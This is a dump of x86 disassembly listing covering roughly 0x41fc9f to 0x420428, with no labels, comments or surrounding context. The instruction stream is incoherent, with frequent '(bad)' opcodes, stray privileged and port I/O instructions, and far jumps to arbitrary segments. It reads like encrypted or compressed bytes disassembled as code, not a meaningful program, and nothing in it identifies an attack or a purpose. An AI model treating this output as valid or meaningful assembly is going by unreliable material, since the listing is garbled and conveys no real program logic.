  41fc9f:	adc    ebp,DWORD PTR [ebx+0x6e5d4d5f]
  41fca5:	cld    
  41fca6:	dec    edx
  41fca7:	or     BYTE PTR [edi],0x51
  41fcaa:	and    al,0x44
  41fcac:	cdq    
  41fcad:	add    ebp,DWORD PTR [edx-0x6efbae9f]
  41fcb3:	adc    ch,BYTE PTR [ecx+0x37e48b8c]
  41fcb9:	arpl   ax,cx
  41fcbb:	int    0x3e
  41fcbd:	cli    
  41fcbe:	ins    BYTE PTR es:[edi],dx
  41fcbf:	aaa    
  41fcc0:	stc    
  41fcc1:	or     BYTE PTR [ebp+0x16],bl
  41fcc4:	iret   
  41fcc5:	xor    esp,DWORD PTR [eax-0x4f]
  41fcc8:	ss loop 0x41fc65
  41fccb:	mov    ecx,edi
  41fccd:	ins    BYTE PTR es:[edi],dx
  41fcce:	sbb    ebp,ebx
  41fcd0:	xor    BYTE PTR [ecx-0x7d3741f],dh
  41fcd6:	sbb    ah,BYTE PTR [ecx-0x2264a1e0]
  41fcdc:	sub    al,0x8f
  41fcde:	ss not ebp
  41fce1:	cld    
  41fce2:	clc    
  41fce3:	mov    dl,0x77
  41fce5:	mov    ecx,DWORD PTR [edi]
  41fce7:	push   esp
  41fce8:	test   al,0x64
  41fcea:	(bad)  
  41fceb:	sbb    al,0x96
  41fced:	mov    DWORD PTR [ecx+eax*2+0x7c],ebx
  41fcf1:	xchg   DWORD PTR [edx-0x66],edi
  41fcf4:	data16 lods al,BYTE PTR ds:[esi]
  41fcf6:	sub    dl,BYTE PTR [ebx+0x2c90ba89]
  41fcfc:	adc    eax,0x8fc31617
  41fd01:	arpl   WORD PTR ds:0x60583030,sp
  41fd07:	fimul  WORD PTR [edi+0x30565159]
  41fd0d:	shr    bl,0xab
  41fd10:	push   0xb357e157
  41fd15:	adc    al,0x2b
  41fd17:	mov    eax,0xe5288e8a
  41fd1c:	inc    ebp
  41fd1d:	mov    DWORD PTR [ebx+0x50a7df57],0x1c62abc6
  41fd27:	inc    esi
  41fd28:	neg    BYTE PTR [eax+eiz*4-0xed2863e]
  41fd2f:	jle    0x41fd55
  41fd31:	(bad)  
  41fd32:	mov    dl,0xdb
  41fd34:	mov    ebx,0x8dacf267
  41fd39:	fwait
  41fd3a:	xor    BYTE PTR [edx-0x407cd865],ah
  41fd40:	jb     0x41fd4e
  41fd42:	test   BYTE PTR [esi],cl
  41fd44:	inc    ebx
  41fd45:	push   esi
  41fd46:	inc    edx
  41fd47:	repz add dh,BYTE PTR [ebp-0x6]
  41fd4b:	cld    
  41fd4c:	out    0xc4,al
  41fd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd4f:	jns    0x41fd20
  41fd51:	xor    BYTE PTR [esi],bl
  41fd53:	cmp    bl,BYTE PTR [ebx-0xfbb616a]
  41fd59:	adc    dh,BYTE PTR [esi+0x1a]
  41fd5c:	and    esp,DWORD PTR [esi+0xe39131f]
  41fd62:	mov    bh,0xd9
  41fd64:	sub    al,0x43
  41fd66:	jecxz  0x41fdd2
  41fd68:	inc    ebp
  41fd69:	add    BYTE PTR [ecx-0x3c],dh
  41fd6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd6d:	adc    DWORD PTR [esi-0xd],edx
  41fd70:	push   ecx
  41fd71:	push   esi
  41fd72:	into   
  41fd73:	xchg   BYTE PTR [esi-0x1d78ae33],cl
  41fd79:	dec    ebp
  41fd7a:	mov    bl,bl
  41fd7c:	inc    ebx
  41fd7d:	cmp    BYTE PTR [ecx-0x674e2cc0],dl
  41fd83:	push   edx
  41fd84:	push   edx
  41fd85:	xchg   edx,eax
  41fd86:	mov    eax,ds:0xd35e0793
  41fd8b:	addr16 repz inc ebp
  41fd8e:	push   ds
  41fd8f:	sbb    ecx,edx
  41fd91:	mov    cs,esi
  41fd93:	test   eax,0x35400d1a
  41fd98:	jg     0x41fd3c
  41fd9a:	push   0x2a
  41fd9c:	icebp  
  41fd9d:	sub    bh,dh
  41fd9f:	jnp    0x41fd44
  41fda1:	push   esi
  41fda2:	adc    DWORD PTR [esi-0x5bb404f5],ecx
  41fda8:	push   0x41823f67
  41fdad:	cmc    
  41fdae:	(bad)  
  41fdaf:	ss pop edi
  41fdb1:	or     DWORD PTR [eax-0x38e39832],esi
  41fdb7:	push   0x28
  41fdb9:	js     0x41fe08
  41fdbb:	rcr    DWORD PTR [esi-0x75],cl
  41fdbe:	lock pop eax
  41fdc0:	leave  
  41fdc1:	(bad)  
  41fdc2:	xor    ah,cl
  41fdc4:	(bad)  
  41fdc5:	loope  0x41fd79
  41fdc7:	dec    BYTE PTR [edx+0x74c7eeb7]
  41fdcd:	push   ss
  41fdce:	fcom   st(7)
  41fdd0:	lock icebp 
  41fdd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdd3:	mov    esi,0x24e4159
  41fdd8:	push   es
  41fdd9:	outs   dx,BYTE PTR ds:[esi]
  41fdda:	mov    al,0x7c
  41fddc:	ins    BYTE PTR es:[edi],dx
  41fddd:	sbb    BYTE PTR [esi-0x2e],dh
  41fde0:	cmp    al,al
  41fde2:	and    al,BYTE PTR [ebp-0x3cc6cd9a]
  41fde8:	sub    bh,BYTE PTR [eax]
  41fdea:	retf   
  41fdeb:	jno    0x41fdfd
  41fded:	pop    esp
  41fdee:	dec    eax
  41fdef:	and    eax,0x1db8b37c
  41fdf4:	(bad)  
  41fdf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf6:	jmp    0x5b160f65
  41fdfb:	cwde   
  41fdfc:	js     0x41fe7b
  41fdfe:	and    al,0x90
  41fe00:	dec    esp
  41fe01:	inc    esp
  41fe02:	pop    edi
  41fe03:	into   
  41fe04:	(bad)  ds:0x8e1179c2
  41fe0a:	ss (bad) 
  41fe0c:	jae    0x41fd8e
  41fe0e:	fiadd  WORD PTR [eax]
  41fe10:	es lahf 
  41fe12:	xchg   ebp,esp
  41fe14:	add    BYTE PTR [ebx],dh
  41fe16:	cmp    esi,edx
  41fe18:	cli    
  41fe19:	aaa    
  41fe1a:	xor    DWORD PTR ds:0x586fff23,ebx
  41fe20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe22:	inc    edx
  41fe23:	mov    ah,0x3e
  41fe25:	mov    eax,0x4fa4d16e
  41fe2a:	pusha  
  41fe2b:	wbinvd 
  41fe2d:	js     0x41fe12
  41fe2f:	jg     0x41fdd5
  41fe31:	push   ecx
  41fe32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe33:	daa    
  41fe34:	fs jmp 0x41fe8d
  41fe37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe38:	add    eax,0xc3c5120d
  41fe3d:	or     DWORD PTR [ebx+esi*2-0x1b],0x4
  41fe42:	xchg   BYTE PTR [ebx+edi*1+0x579539a9],dh
  41fe49:	bound  edi,QWORD PTR [edx-0x4e]
  41fe4c:	imul   eax,DWORD PTR [edi-0x7b499c17],0xffffff8a
  41fe53:	jmp    0x41fe9e
  41fe55:	or     al,0x4a
  41fe57:	inc    edx
  41fe58:	inc    edi
  41fe59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe5a:	sub    DWORD PTR [ecx-0xfbde8f],ebx
  41fe60:	loop   0x41fe9d
  41fe62:	aad    0xf9
  41fe64:	mov    edx,DWORD PTR [esi]
  41fe66:	mov    ah,0xc1
  41fe68:	das    
  41fe69:	or     al,0x5d
  41fe6b:	or     bl,BYTE PTR [esi]
  41fe6d:	(bad)  
  41fe6e:	std    
  41fe6f:	or     ecx,DWORD PTR [eax-0x56]
  41fe72:	xchg   BYTE PTR [ebx+ebp*4-0x31],ah
  41fe76:	sub    edi,0xffffffa4
  41fe79:	in     eax,0xb0
  41fe7b:	jmp    0x41fea8
  41fe7d:	movzx  ecx,di
  41fe80:	call   0x3b64:0x11ee0ba5
  41fe87:	std    
  41fe88:	and    ah,ah
  41fe8a:	add    BYTE PTR [ecx-0x3d2ad8b3],ah
  41fe90:	mov    al,0x79
  41fe92:	stc    
  41fe93:	sahf   
  41fe94:	call   0x2691:0x7dab9b40
  41fe9b:	cwde   
  41fe9c:	xor    dl,BYTE PTR [ebx+0x2d3f0166]
  41fea2:	data16 das 
  41fea4:	aad    0xfa
  41fea6:	ins    BYTE PTR es:[edi],dx
  41fea7:	hlt    
  41fea8:	aad    0x1a
  41feaa:	lea    ecx,[edx-0x40]
  41fead:	(bad)  
  41feae:	mov    ds:0x92bc71c7,al
  41feb3:	call   0x18a7a30e
  41feb8:	stc    
  41feb9:	fs push 0xffffff84
  41febc:	or     eax,DWORD PTR [edx+ebx*8-0x19]
  41fec0:	or     DWORD PTR [edx+eiz*4+0x34],ecx
  41fec4:	jmp    0x9b2b:0x15a5bbc2
  41fecb:	and    esp,DWORD PTR [esi]
  41fecd:	out    dx,eax
  41fece:	pop    edi
  41fecf:	daa    
  41fed0:	pop    esi
  41fed1:	mov    cl,0xff
  41fed3:	jne    0x41ff08
  41fed5:	stos   BYTE PTR es:[edi],al
  41fed6:	sub    BYTE PTR [edi+0x3e],0xc3
  41feda:	(bad)  
  41fedb:	out    0x5e,al
  41fedd:	dec    esi
  41fede:	sti    
  41fedf:	sbb    eax,0xa140cf8a
  41fee4:	call   0x5e5319c8
  41fee9:	mov    al,0x9c
  41feeb:	pop    esi
  41feec:	es push 0xffffffa9
  41feef:	adc    dh,BYTE PTR [ebx-0x57]
  41fef2:	ja     0x41feec
  41fef4:	cmp    DWORD PTR [ebp-0x68],edi
  41fef7:	push   0x29a9aa61
  41fefc:	out    dx,al
  41fefd:	sub    al,0x8
  41feff:	xchg   esp,eax
  41ff00:	jae    0x41fed6
  41ff02:	not    DWORD PTR [edx+esi*1]
  41ff05:	mov    esi,0x19ff3b29
  41ff0a:	mov    gs,WORD PTR [edi-0x6]
  41ff0d:	add    BYTE PTR [ebp-0x3618b22d],cl
  41ff13:	push   cs
  41ff14:	xchg   BYTE PTR [ebx],bl
  41ff16:	push   edi
  41ff17:	in     al,dx
  41ff18:	rol    DWORD PTR [esi+esi*4],cl
  41ff1b:	(bad)  
  41ff1c:	push   ecx
  41ff1d:	sbb    al,0x2
  41ff1f:	jmp    0x41fecf
  41ff21:	xchg   ecx,eax
  41ff22:	inc    edi
  41ff23:	icebp  
  41ff24:	lods   eax,DWORD PTR ds:[esi]
  41ff25:	inc    DWORD PTR [esi]
  41ff27:	mov    ecx,0xa4192d2f
  41ff2c:	es and esi,ebp
  41ff2f:	cmc    
  41ff30:	fdiv   DWORD PTR [edx-0x75]
  41ff33:	sub    BYTE PTR [esi],ah
  41ff35:	out    0xd1,al
  41ff37:	mov    ecx,0x967b0229
  41ff3c:	adc    esp,esi
  41ff3e:	cmp    BYTE PTR [ebp-0x6e],ch
  41ff41:	xchg   ebx,eax
  41ff42:	sbb    al,0xa4
  41ff44:	div    bh
  41ff46:	(bad)  
  41ff47:	(bad)  
  41ff49:	or     BYTE PTR [eax+0x1d26c6bc],ah
  41ff4f:	xchg   DWORD PTR [edx-0x1c262b7b],esp
  41ff55:	mov    al,ds:0x18b09b6a
  41ff5a:	cmp    eax,0x8d1f933a
  41ff5f:	mov    ?,WORD PTR [ebx+0xd]
  41ff62:	(bad)  
  41ff63:	jnp    0x41ffb3
  41ff65:	aam    0xbe
  41ff67:	stc    
  41ff68:	sti    
  41ff69:	dec    eax
  41ff6a:	out    0xaa,al
  41ff6c:	xchg   dl,dl
  41ff6e:	test   DWORD PTR [eax],ecx
  41ff70:	cmp    al,0x80
  41ff72:	sub    eax,0x2e264976
  41ff77:	ss push cs
  41ff79:	xchg   esp,eax
  41ff7a:	sar    DWORD PTR [edx+ecx*2+0x6bfe9d6c],cl
  41ff81:	mov    ds,WORD PTR [ebx]
  41ff83:	fadd   DWORD PTR [ebx+0x18]
  41ff86:	lods   eax,DWORD PTR ds:[esi]
  41ff87:	dec    eax
  41ff88:	jl     0x41ff0b
  41ff8a:	mov    bh,BYTE PTR [ecx+0x58]
  41ff8d:	mov    al,ds:0x709f4bb9
  41ff92:	mov    dh,ch
  41ff94:	mov    esi,0xb6f3aee
  41ff99:	call   0x158b:0xbe165519
  41ffa0:	imul   ebp,edx,0xffffffc1
  41ffa3:	(bad)  
  41ffa4:	popf   
  41ffa5:	and    DWORD PTR [edi],ebx
  41ffa7:	loope  0x41ff6a
  41ffa9:	jbe    0x41ff77
  41ffab:	in     al,dx
  41ffac:	jp     0x42000d
  41ffae:	fldcw  WORD PTR [esp+eax*2]
  41ffb1:	aaa    
  41ffb2:	mov    al,0x97
  41ffb4:	mov    dl,0x58
  41ffb6:	dec    ebx
  41ffb7:	dec    esi
  41ffb8:	sub    BYTE PTR [ebx+0x56188af4],al
  41ffbe:	repnz into 
  41ffc0:	or     al,0x44
  41ffc2:	out    0x49,eax
  41ffc4:	int3   
  41ffc5:	add    esp,DWORD PTR [eax+0x509f0132]
  41ffcb:	dec    esi
  41ffcc:	(bad)  
  41ffcd:	sbb    ecx,DWORD PTR [ebx+ecx*4-0x3b]
  41ffd1:	fnstcw WORD PTR [ebx+0x28]
  41ffd4:	push   esi
  41ffd5:	call   FWORD PTR [edx-0x5c011dfc]
  41ffdb:	movaps XMMWORD PTR [esi],xmm6
  41ffde:	not    DWORD PTR [ecx+0x4c]
  41ffe1:	inc    esi
  41ffe2:	je     0x41fff2
  41ffe4:	mov    dh,0x74
  41ffe6:	in     eax,dx
  41ffe7:	jnp    0x41ffeb
  41ffe9:	mov    ds:0xa16036ec,al
  41ffee:	sub    cl,bl
  41fff0:	outs   dx,DWORD PTR ds:[esi]
  41fff1:	dec    eax
  41fff2:	dec    ebp
  41fff3:	dec    ebx
  41fff4:	adc    dh,BYTE PTR [eax-0x659b7e14]
  41fffa:	in     eax,0x7e
  41fffc:	retf   0x4e6
  41ffff:	lea    ebp,[edi]
  420001:	cli    
  420002:	and    DWORD PTR [eax+0x29],0x73
  420006:	or     eax,0x3d6efc28
  42000b:	dec    edi
  42000c:	push   0xffffffa2
  42000e:	icebp  
  42000f:	lahf   
  420010:	mov    dl,0x9b
  420012:	jge    0x41ffc0
  420014:	lods   al,BYTE PTR ds:[esi]
  420015:	fmul   DWORD PTR [eax-0xb]
  420018:	push   0xea6b81bf
  42001d:	sub    edx,eax
  42001f:	push   ebp
  420020:	dec    ebp
  420021:	cdq    
  420022:	mov    al,0x1f
  420024:	xchg   esp,eax
  420025:	and    al,0xa8
  420027:	out    0x29,eax
  420029:	ja     0x41fffd
  42002b:	jno    0x41ffdb
  42002d:	data16 fldcw WORD PTR [ebx+eiz*1-0x64]
  420032:	test   al,0x8c
  420034:	or     DWORD PTR [eax],ebp
  420036:	sbb    al,0xab
  420038:	call   0x2db2:0xaadc7b5c
  42003f:	test   eax,0x237ae9b
  420044:	rol    DWORD PTR [di],1
  420047:	or     BYTE PTR [ecx-0x4f547bb5],bh
  42004d:	add    eax,0x9139eb51
  420052:	mov    WORD PTR [ecx],ds
  420054:	pusha  
  420055:	sti    
  420056:	jmp    0x21ab3ef2
  42005b:	add    dl,BYTE PTR [edi+0x14d3a124]
  420061:	std    
  420062:	xor    eax,0x924ff94f
  420067:	sbb    eax,0x45890f38
  42006c:	jg     0x4200ca
  42006e:	lock and ebp,esp
  420071:	enter  0xc32c,0xce
  420075:	loop   0x420013
  420077:	push   esp
  420078:	inc    edi
  420079:	sbb    eax,0x5b8becd5
  42007e:	mov    edi,0xb3b3484f
  420083:	adc    al,0x59
  420085:	out    dx,eax
  420086:	cs mov bl,0x72
  420089:	push   edi
  42008a:	frstor [eax]
  42008c:	sub    ebp,DWORD PTR [ebx]
  42008e:	dec    ebp
  42008f:	sbb    al,0x5d
  420091:	sbb    eax,0xa6e7468c
  420096:	cmp    BYTE PTR [ebx],cl
  420098:	fimul  WORD PTR [eax]
  42009a:	imul   edx,DWORD PTR [edx],0x13cf9801
  4200a0:	and    DWORD PTR [ecx],ebp
  4200a2:	xchg   ebp,eax
  4200a3:	mov    edi,0xafbdfb6b
  4200a8:	push   edx
  4200a9:	mov    dl,0xa
  4200ab:	hlt    
  4200ac:	jle    0x420052
  4200ae:	jle    0x42008b
  4200b0:	test   dl,al
  4200b2:	ja     0x4200d3
  4200b4:	ret    0x26bf
  4200b7:	scas   al,BYTE PTR es:[edi]
  4200b8:	(bad)  
  4200b9:	or     dh,al
  4200bb:	(bad)  
  4200bc:	(bad)  
  4200bd:	out    0xe1,eax
  4200bf:	ins    DWORD PTR es:[edi],dx
  4200c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200c1:	mov    WORD PTR [eax+eax*1+0x506b79],?
  4200c8:	inc    edi
  4200c9:	push   0x7b75c9f0
  4200ce:	xlat   BYTE PTR ds:[ebx]
  4200cf:	repz mov dl,0xac
  4200d2:	jnp    0x420059
  4200d4:	ss mov al,cs:0x661145be
  4200db:	pop    ds
  4200dc:	loope  0x420086
  4200de:	loopne 0x4200ae
  4200e0:	or     eax,0xaa19ed32
  4200e5:	cld    
  4200e6:	push   ecx
  4200e7:	push   DWORD PTR [ebx+0x5de9d152]
  4200ed:	cwde   
  4200ee:	jle    0x4200ad
  4200f0:	jp     0x420146
  4200f2:	xchg   esp,eax
  4200f3:	sbb    BYTE PTR [eax+0x14],ch
  4200f6:	jmp    0x420098
  4200f8:	jo     0x4200fe
  4200fa:	adc    al,BYTE PTR [edx]
  4200fc:	stos   DWORD PTR es:[edi],eax
  4200fd:	xor    al,0x9c
  4200ff:	adc    bl,BYTE PTR ds:0x73755c11
  420105:	xor    DWORD PTR fs:[edi-0x1670f2d2],ecx
  42010c:	inc    ebp
  42010d:	stos   DWORD PTR es:[edi],eax
  42010e:	jmp    0x87aa1f35
  420113:	mov    ebx,0x13a11a46
  420118:	mov    esp,0xcd936443
  42011d:	sbb    dh,BYTE PTR ds:0x16d77a53
  420123:	mov    ecx,es
  420125:	sub    eax,0xd29be86b
  42012a:	sahf   
  42012b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42012c:	jp     0x4200b5
  42012e:	and    eax,0xe8c1da36
  420133:	lahf   
  420134:	bound  esi,QWORD PTR [ecx+0x3b]
  420137:	int3   
  420138:	mov    ds:0xc31a35a6,al
  42013d:	or     DWORD PTR [esi],eax
  42013f:	pop    ebx
  420140:	mov    cs,WORD PTR [edx]
  420142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420143:	inc    edi
  420144:	cld    
  420145:	pop    ds
  420146:	fist   DWORD PTR [eax+0x43]
  420149:	pop    esp
  42014a:	inc    ebx
  42014b:	mov    bl,0x9b
  42014d:	test   al,0x68
  42014f:	mov    ebx,0x217c512e
  420154:	fld    QWORD PTR [edx]
  420156:	cs jo  0x420198
  420159:	shl    bh,cl
  42015b:	lods   eax,DWORD PTR ds:[esi]
  42015c:	lahf   
  42015d:	popf   
  42015e:	cmp    ah,bh
  420160:	adc    eax,0x647e9695
  420165:	out    dx,eax
  420166:	pop    ss
  420167:	out    dx,al
  420168:	and    DWORD PTR [ebx-0x5c],ecx
  42016b:	or     edx,DWORD PTR [ebp+0x3b90daf6]
  420171:	fwait
  420172:	es cld 
  420174:	arpl   WORD PTR [esi-0x24113560],sp
  42017a:	lods   eax,DWORD PTR ds:[esi]
  42017b:	out    dx,al
  42017c:	call   FWORD PTR [edx-0x54ef72f9]
  420182:	jnp    0x4201a3
  420184:	jmp    0x4201c8
  420186:	sub    al,0x47
  420188:	add    BYTE PTR [ebx],dl
  42018a:	mov    dh,0x86
  42018c:	adc    BYTE PTR [edx],dl
  42018e:	ror    BYTE PTR [edi+0x3a],0xe3
  420192:	push   es
  420193:	ss jmp 0x420167
  420196:	mov    eax,0xf658426a
  42019b:	scas   eax,DWORD PTR es:[edi]
  42019c:	outs   dx,BYTE PTR ds:[esi]
  42019d:	cmc    
  42019e:	inc    ebp
  42019f:	lock stos BYTE PTR es:[edi],al
  4201a1:	sub    BYTE PTR [ecx-0x58],cl
  4201a4:	out    0x19,eax
  4201a6:	push   eax
  4201a7:	jmp    0x420182
  4201a9:	sbb    bh,BYTE PTR [esi+0x658a830f]
  4201af:	cmp    BYTE PTR [eax+ebp*4+0x23],cl
  4201b3:	sbb    dh,BYTE PTR [esi]
  4201b5:	mov    bh,0x50
  4201b7:	push   ebx
  4201b8:	pushf  
  4201b9:	jae    0x4201bc
  4201bb:	repz inc ecx
  4201bd:	out    0xf4,al
  4201bf:	daa    
  4201c0:	adc    al,0xfd
  4201c2:	inc    esp
  4201c3:	jns    0x4201e1
  4201c5:	xchg   ebp,eax
  4201c6:	adc    DWORD PTR [ebx+edi*2+0x64],edx
  4201ca:	in     al,0x99
  4201cc:	pusha  
  4201cd:	jl     0x4201f8
  4201cf:	add    eax,0x95b3f751
  4201d4:	sub    BYTE PTR [edx],al
  4201d6:	add    DWORD PTR [ebx],ebp
  4201d8:	xchg   edx,eax
  4201d9:	aas    
  4201da:	jge    0x420161
  4201dc:	mov    al,ds:0xfac6841c
  4201e1:	sbb    bh,BYTE PTR [edi+0x6616e19d]
  4201e7:	dec    edi
  4201e8:	push   ebx
  4201e9:	inc    ebp
  4201ea:	xor    eax,0x5aedfa8b
  4201ef:	push   ecx
  4201f0:	ins    BYTE PTR es:[edi],dx
  4201f1:	aaa    
  4201f2:	test   al,0x9c
  4201f4:	retf   0xbef2
  4201f7:	inc    esp
  4201f8:	adc    DWORD PTR [ecx+ecx*2-0x38],0x1c07070f
  420200:	rol    BYTE PTR [ebx-0x1a2d7229],0xfd
  420207:	dec    ebp
  420208:	dec    ebx
  420209:	cs jg  0x42022b
  42020c:	mov    al,0x1d
  42020e:	repnz call 0x527a:0x767514ff
  420216:	inc    ebp
  420217:	sbb    ecx,0xffffffe5
  42021a:	cmc    
  42021b:	mov    BYTE PTR ds:0x2ab58f47,ah
  420221:	push   ds
  420222:	mov    ah,BYTE PTR [edx]
  420224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420225:	mov    esi,0xd6662404
  42022a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42022b:	gs mov ch,0x38
  42022e:	xor    ebp,DWORD PTR [ebx+0x63]
  420231:	or     BYTE PTR [ebp-0xe],0xd7
  420235:	jb     0x42026a
  420237:	xor    bl,al
  420239:	mov    al,0xa0
  42023b:	les    eax,FWORD PTR [esi]
  42023d:	je     0x420293
  42023f:	icebp  
  420240:	inc    eax
  420241:	jmp    0x925:0x22a14731
  420248:	add    DWORD PTR [ebp+0x5913d383],ebp
  42024e:	pop    ss
  42024f:	sub    BYTE PTR [eax-0x41],bl
  420252:	xor    DWORD PTR [ebx+0x2f],edi
  420255:	inc    edx
  420256:	popf   
  420257:	cmp    al,0x53
  420259:	xlat   BYTE PTR ds:[ebx]
  42025a:	bnd jo 0x4202b2
  42025d:	add    bh,BYTE PTR [ecx+0x2e1d95cb]
  420263:	(bad)  
  420264:	mov    DWORD PTR cs:[eax],0x88ce773e
  42026b:	bound  edi,QWORD PTR [edx]
  42026d:	aam    0x6
  42026f:	ret    
  420270:	dec    edi
  420271:	mov    edx,eax
  420273:	retf   
  420274:	(bad)  
  420275:	fcomp  QWORD PTR [ebx+0x39004b4]
  42027b:	mov    esp,0x659d1831
  420280:	push   ds
  420281:	es pop ebx
  420283:	pop    esi
  420284:	sub    dl,al
  420286:	cmp    eax,0x33e1b690
  42028b:	inc    ebp
  42028c:	mov    al,0x2a
  42028e:	jg     0x420265
  420290:	mov    BYTE PTR [esp+ecx*2],bl
  420293:	ret    0x6ecf
  420296:	(bad)  
  420297:	loopne 0x4202e3
  420299:	mov    es,WORD PTR [ecx+0x13196978]
  42029f:	ins    BYTE PTR es:[edi],dx
  4202a0:	and    al,0x98
  4202a2:	mov    dl,0xf
  4202a4:	sbb    al,0x5a
  4202a6:	fstp   TBYTE PTR [ebx]
  4202a8:	dec    esi
  4202a9:	ja     0x420287
  4202ab:	scas   eax,DWORD PTR es:[edi]
  4202ac:	aam    0x13
  4202ae:	iret   
  4202af:	scas   eax,DWORD PTR es:[edi]
  4202b0:	add    eax,0x4b14fb0
  4202b5:	or     eax,0x17c84ce0
  4202ba:	aaa    
  4202bb:	int    0xbe
  4202bd:	cwde   
  4202be:	aas    
  4202bf:	ja     0x42026d
  4202c1:	adc    eax,0x46b19698
  4202c6:	mov    eax,0x2038531
  4202cb:	stos   DWORD PTR es:[edi],eax
  4202cc:	fsub   DWORD PTR [ecx+esi*8+0x7c]
  4202d0:	dec    ebx
  4202d1:	mov    eax,ds:0x7e4e98cb
  4202d6:	imul   ebp,DWORD PTR [edi+0x43],0x1a
  4202da:	xchg   ebx,eax
  4202db:	fisttp QWORD PTR [ebp-0x55]
  4202de:	push   cs
  4202df:	xchg   esp,eax
  4202e0:	in     al,dx
  4202e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202e2:	jae    0x420297
  4202e4:	repnz sbb DWORD PTR ds:0x7ca34b69,esp
  4202eb:	jge    0x42028a
  4202ed:	push   ebx
  4202ee:	je     0x420321
  4202f0:	neg    DWORD PTR [edi-0x1a]
  4202f3:	dec    esi
  4202f4:	(bad)  
  4202f5:	js     0x420286
  4202f7:	or     BYTE PTR [edx],cl
  4202f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202fa:	jmp    0x42035d
  4202fc:	mov    al,0x7c
  4202fe:	jmp    0x1273:0x7550514d
  420305:	sub    esi,DWORD PTR [ebx]
  420307:	out    0xce,al
  420309:	lods   al,BYTE PTR ds:[esi]
  42030a:	arpl   bp,di
  42030c:	push   ss
  42030d:	cli    
  42030e:	push   es
  42030f:	aam    0x23
  420311:	mov    fs,WORD PTR [ebp-0x41]
  420314:	rcr    BYTE PTR [eax],0x71
  420317:	and    BYTE PTR [ebx],cl
  420319:	jle    0x42031c
  42031b:	mov    al,ds:0x86780021
  420320:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420323:	sub    cl,bl
  420325:	adc    al,0x1e
  420327:	jg     0x420354
  420329:	dec    ebx
  42032a:	mov    esp,0x2c2fab50
  42032f:	xor    ebp,DWORD PTR [ebx+ebx*1+0x46]
  420333:	dec    ebx
  420334:	retf   
  420335:	cdq    
  420336:	xchg   DWORD PTR [eax+0x663bd655],esi
  42033c:	mov    eax,ds:0x94179ea3
  420341:	mov    bh,0x50
  420343:	in     al,0x21
  420345:	cmp    BYTE PTR ds:[edi+ecx*8],dl
  420349:	js     0x4203c7
  42034b:	pop    esi
  42034c:	xor    DWORD PTR [ebx+0x7d],esi
  42034f:	fadd   QWORD PTR [ebx-0x73641df9]
  420355:	jl     0x42037d
  420357:	mov    eax,DWORD PTR ds:0x4ba332cf
  42035d:	je     0x420315
  42035f:	loope  0x42035e
  420361:	mov    ah,0xe0
  420363:	ss and cl,dh
  420366:	(bad)  
  420367:	(bad)  
  420368:	or     esp,esi
  42036a:	pop    esp
  42036b:	mov    dl,0x8c
  42036d:	mov    cl,cl
  42036f:	mov    eax,0x74ebc013
  420374:	mov    edi,0x602cc22d
  420379:	clc    
  42037a:	pop    ebp
  42037b:	in     al,0x74
  42037d:	adc    eax,0x58533a10
  420382:	dec    esi
  420383:	imul   DWORD PTR ds:0xb0896748
  420389:	out    0xe9,eax
  42038b:	push   esi
  42038c:	cmp    eax,0x209c61a3
  420391:	mov    edi,0xe311408c
  420396:	xor    eax,0xbee68abc
  42039b:	mov    esi,0x30b9bc95
  4203a0:	sahf   
  4203a1:	mov    edx,0xbf68a630
  4203a6:	or     DWORD PTR [edx+0x53],ebp
  4203a9:	push   edx
  4203aa:	out    0x57,al
  4203ac:	leave  
  4203ad:	cs loopne 0x420343
  4203b0:	loop   0x4203e9
  4203b2:	push   edx
  4203b3:	in     al,dx
  4203b4:	pop    ss
  4203b5:	sub    BYTE PTR [eax],0x6f
  4203b8:	xor    DWORD PTR [esi+0x26],0x54
  4203bc:	fs jl  0x42040f
  4203bf:	push   es
  4203c0:	repz push 0x33
  4203c3:	in     eax,0x8f
  4203c5:	pusha  
  4203c6:	and    dh,bh
  4203c8:	xor    al,0x5a
  4203ca:	or     edx,DWORD PTR [edx-0x58]
  4203cd:	stos   BYTE PTR es:[edi],al
  4203ce:	jns    0x420438
  4203d0:	enter  0xcbe8,0xd9
  4203d4:	pop    es
  4203d5:	push   cs
  4203d6:	xor    bh,bh
  4203d8:	dec    ebp
  4203d9:	jl     0x420428
  4203db:	das    
  4203dc:	arpl   ax,si
  4203de:	cmp    eax,0xf0463381
  4203e3:	pushf  
  4203e4:	mov    cl,0x16
  4203e6:	lods   eax,DWORD PTR ds:[esi]
  4203e7:	arpl   WORD PTR [eax*4-0x3259bba0],cx
  4203ee:	xchg   edx,eax
  4203ef:	cmp    cl,BYTE PTR cs:[esi-0x1]
  4203f3:	or     DWORD PTR [edi+ecx*4-0x79086d18],0x17
  4203fb:	retf   
  4203fc:	xlat   BYTE PTR ds:[ebx]
  4203fd:	cld    
  4203fe:	in     al,dx
  4203ff:	mov    esp,0xea07fae3
  420404:	pop    edx
  420405:	push   eax
  420406:	add    eax,0xf481e8e7
  42040b:	jb     0x42048b
  42040d:	inc    ebx
  42040e:	jmp    0xb0d2c908
  420413:	mov    esi,0x70d51bfa
  420418:	shr    edx,1
  42041a:	jno    0x420404
  42041c:	adc    DWORD PTR [edi-0x184817af],ecx
  420422:	out    dx,al
  420423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420424:	lods   al,BYTE PTR ds:[esi]
  420425:	(bad)  
  420426:	and    al,0xd6
  420428:	pop    ecx
  420429:	adc    eax,0x2e1953df
  42042e:	nop
